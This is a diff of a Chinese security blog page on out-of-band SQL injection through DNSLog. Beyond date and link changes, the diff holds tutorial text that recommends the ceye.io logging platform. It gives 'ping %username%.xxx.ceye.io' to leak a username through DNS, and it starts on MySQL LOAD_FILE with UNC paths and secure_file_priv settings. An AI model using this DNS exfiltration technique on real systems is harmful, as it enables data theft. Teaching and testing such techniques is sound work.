@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="本文来源于自己之前的博客园文章 一.什么是DNSLogDNS就是域名解析服务，把一个域名转换为对应的ip，转换完成之后，DNS服务器就会有一个日志来记录本次转换的时间、域名、域名对应的ip、请求方的一些信息，这个日志就叫DNSLog。但是，必须是拥有这个DNS服务器的人，才可以查看DNSLog，为了更加深刻理解DNSLog注入，推荐一个平台 ceye.io，注册之后，就会有一个自己的DNS服务器下">
+    <meta name="description" content="一.什么是DNSLogDNS就是域名解析服务，把一个域名转换为对应的ip，转换完成之后，DNS服务器就会有一个日志来记录本次转换的时间、域名、域名对应的ip、请求方的一些信息，这个日志就叫DNSLog。但是，必须是拥有这个DNS服务器的人，才可以查看DNSLog，为了更加深刻理解DNSLog注入，推荐一个平台 ceye.io，注册之后，就会有一个自己的DNS服务器下图就是注册之后的，首先需要得到这">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SQL注入之DNSLog注入">
-<meta property="og:url" content="http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:url" content="http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Reweber">
-<meta property="og:description" content="本文来源于自己之前的博客园文章 一.什么是DNSLogDNS就是域名解析服务，把一个域名转换为对应的ip，转换完成之后，DNS服务器就会有一个日志来记录本次转换的时间、域名、域名对应的ip、请求方的一些信息，这个日志就叫DNSLog。但是，必须是拥有这个DNS服务器的人，才可以查看DNSLog，为了更加深刻理解DNSLog注入，推荐一个平台 ceye.io，注册之后，就会有一个自己的DNS服务器下">
+<meta property="og:description" content="一.什么是DNSLogDNS就是域名解析服务，把一个域名转换为对应的ip，转换完成之后，DNS服务器就会有一个日志来记录本次转换的时间、域名、域名对应的ip、请求方的一些信息，这个日志就叫DNSLog。但是，必须是拥有这个DNS服务器的人，才可以查看DNSLog，为了更加深刻理解DNSLog注入，推荐一个平台 ceye.io，注册之后，就会有一个自己的DNS服务器下图就是注册之后的，首先需要得到这">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://s2.loli.net/2024/01/02/naKmI3WFfE4qeO2.png">
 <meta property="og:image" content="https://s2.loli.net/2024/01/03/g61ElvHIiOspSDe.png">
@@ -29,8 +29,8 @@
 <meta property="og:image" content="https://www.freeimg.cn/i/2024/01/03/659437099276e.png">
 <meta property="og:image" content="https://www.freeimg.cn/i/2024/01/03/65943709c874f.png">
 <meta property="og:image" content="https://www.freeimg.cn/i/2024/01/03/6594370976374.png">
-<meta property="article:published_time" content="2023-11-02T13:44:25.000Z">
-<meta property="article:modified_time" content="2024-01-02T16:21:26.260Z">
+<meta property="article:published_time" content="2022-11-30T13:44:25.000Z">
+<meta property="article:modified_time" content="2024-01-02T16:34:40.066Z">
 <meta property="article:author" content="Reweber">
 <meta property="article:tag" content="Web漏洞">
 <meta name="twitter:card" content="summary">
@@ -97,10 +97,10 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" aria-label="Previous post" href="/2023/11/23/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8BNPS%E9%9A%A7%E9%81%93%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Previous post" href="/2023/10/04/%E6%89%AB%E6%8F%8F%E7%A5%9E%E5%99%A8-Fscan/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
-        <li><a class="icon" aria-label="Next post" href="/2023/10/18/%E5%85%B3%E4%BA%8E%E7%97%85%E6%AF%92%E8%A2%AB%E6%9D%80%E8%BD%AF%E6%9F%A5%E6%9D%80%E4%BD%86%E6%80%81%E5%8A%BF%E8%BF%98%E6%98%AF%E4%BC%9A%E5%91%8A%E8%AD%A6/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Next post" href="/2022/11/27/CobaltStrike%E6%B3%A8%E5%85%A5MSF%E4%BC%9A%E8%AF%9D/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
@@ -113,17 +113,17 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&text=SQL注入之DNSLog注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&title=SQL注入之DNSLog注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&is_video=false&description=SQL注入之DNSLog注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=SQL注入之DNSLog注入&body=Check out this article: http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&title=SQL注入之DNSLog注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&title=SQL注入之DNSLog注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&title=SQL注入之DNSLog注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&title=SQL注入之DNSLog注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&name=SQL注入之DNSLog注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&t=SQL注入之DNSLog注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&text=SQL注入之DNSLog注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&title=SQL注入之DNSLog注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&is_video=false&description=SQL注入之DNSLog注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SQL注入之DNSLog注入&body=Check out this article: http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&title=SQL注入之DNSLog注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&title=SQL注入之DNSLog注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&title=SQL注入之DNSLog注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&title=SQL注入之DNSLog注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&name=SQL注入之DNSLog注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&t=SQL注入之DNSLog注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -155,7 +155,7 @@
       
     <div class="postdate">
       
-        <time datetime="2023-11-02T13:44:25.000Z" class="dt-published" itemprop="datePublished">2023-11-02</time>
+        <time datetime="2022-11-30T13:44:25.000Z" class="dt-published" itemprop="datePublished">2022-11-30</time>
         
       
     </div>
@@ -175,8 +175,7 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <p>本文来源于自己之前的博客园文章</p>
-<h3 id="一-什么是DNSLog"><a href="#一-什么是DNSLog" class="headerlink" title="一.什么是DNSLog"></a>一.什么是DNSLog</h3><p>DNS就是域名解析服务，把一个域名转换为对应的ip，转换完成之后，DNS服务器就会有一个日志来记录本次转换的时间、域名、域名对应的ip、请求方的一些信息，这个日志就叫DNSLog。但是，必须是拥有这个DNS服务器的人，才可以查看DNSLog，为了更加深刻理解DNSLog注入，推荐一个平台 ceye.io，注册之后，就会有一个自己的DNS服务器<br><br>下图就是注册之后的，首先需要得到这个Identifier<br><img src="https://s2.loli.net/2024/01/02/naKmI3WFfE4qeO2.png" alt="1.png"><br>然后我在本机上ping一下这个Identifier<br><img src="https://s2.loli.net/2024/01/03/g61ElvHIiOspSDe.png" alt="2.png"><br>然后在ceye平台上就会有一个对应的记录<br><img src="https://s2.loli.net/2024/01/03/lCdmPc4N8jt1euJ.png" alt="3.png"></p>
+    <h3 id="一-什么是DNSLog"><a href="#一-什么是DNSLog" class="headerlink" title="一.什么是DNSLog"></a>一.什么是DNSLog</h3><p>DNS就是域名解析服务，把一个域名转换为对应的ip，转换完成之后，DNS服务器就会有一个日志来记录本次转换的时间、域名、域名对应的ip、请求方的一些信息，这个日志就叫DNSLog。但是，必须是拥有这个DNS服务器的人，才可以查看DNSLog，为了更加深刻理解DNSLog注入，推荐一个平台 ceye.io，注册之后，就会有一个自己的DNS服务器<br><br>下图就是注册之后的，首先需要得到这个Identifier<br><img src="https://s2.loli.net/2024/01/02/naKmI3WFfE4qeO2.png" alt="1.png"><br>然后我在本机上ping一下这个Identifier<br><img src="https://s2.loli.net/2024/01/03/g61ElvHIiOspSDe.png" alt="2.png"><br>然后在ceye平台上就会有一个对应的记录<br><img src="https://s2.loli.net/2024/01/03/lCdmPc4N8jt1euJ.png" alt="3.png"></p>
 <h3 id="二-如何利用DNSLog"><a href="#二-如何利用DNSLog" class="headerlink" title="二.如何利用DNSLog"></a>二.如何利用DNSLog</h3><p>在ping 这个地址的时候，是可以变为多级的，比如一开始是 ping xxx.ceye.io ，但是我可以这样<br>ping %username%.xxx.ceye.io<br><img src="https://s2.loli.net/2024/01/03/UkmNL3abqFQCtDO.png" alt="4.png"><br>这样，平台产生的记录，就会得到你当前计算机的用户名(我这里遮掉了)<br><img src="https://s2.loli.net/2024/01/03/NylXuZRBcEUI5DW.png" alt="5.png"><br>那么，同样的道理，我如果这里放一个sql语句，是不是也会执行呢?<br>再补充一个内容，叫UNC，它是windows上面共享资源地址的格式，比如你分享一个文件出去，然后就会产生一个访问这个文件的地址，这个就是UNC的路径，可以理解为UNC就是访问共享资源地址的格式<br>那这个DNSLog和数据库(这里以MYSQL为列)会有什么关联呢？<br>MYSQL里面有一个文件读写的函数，LOAD_FILE(文件路径)</p>
 <p>如何利用这个函数呢？<br>1.需要在mysql的my.ini文件里面配置参数 secure_file_priv<br>在[mysqld]下面配置，配置完了之后需要重启mysql，管理员身份执行 net stop mysql 再net start mysql<br><img src="https://s2.loli.net/2024/01/03/v9bklY5KjyrV6xF.png" alt="6.png"><br>然后再查询看看是否真的打开了 命令 show variables like ‘%secure_file_priv%’，如下图，是打开了的<br><img src="https://s2.loli.net/2024/01/03/aZwAlMUnRhWHOB3.png" alt="7.png"></p>
 <p>2.有了读写权限之后，这个读写函数，只能读取本机的文件，并且读取的字节数要小于max_allowed_packet</p>
@@ -218,17 +217,17 @@
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&text=SQL注入之DNSLog注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&title=SQL注入之DNSLog注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&is_video=false&description=SQL注入之DNSLog注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=SQL注入之DNSLog注入&body=Check out this article: http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&title=SQL注入之DNSLog注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&title=SQL注入之DNSLog注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&title=SQL注入之DNSLog注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&title=SQL注入之DNSLog注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&name=SQL注入之DNSLog注入&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/11/02/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&t=SQL注入之DNSLog注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&text=SQL注入之DNSLog注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&title=SQL注入之DNSLog注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&is_video=false&description=SQL注入之DNSLog注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SQL注入之DNSLog注入&body=Check out this article: http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&title=SQL注入之DNSLog注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&title=SQL注入之DNSLog注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&title=SQL注入之DNSLog注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&title=SQL注入之DNSLog注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&name=SQL注入之DNSLog注入&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/11/30/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BDNSLog%E6%B3%A8%E5%85%A5/&t=SQL注入之DNSLog注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -251,7 +250,7 @@
         Copyright &copy;
         
         
-        2023-2024
+        2022-2024
         Reweber
       </div>
       <div class="footer-right">
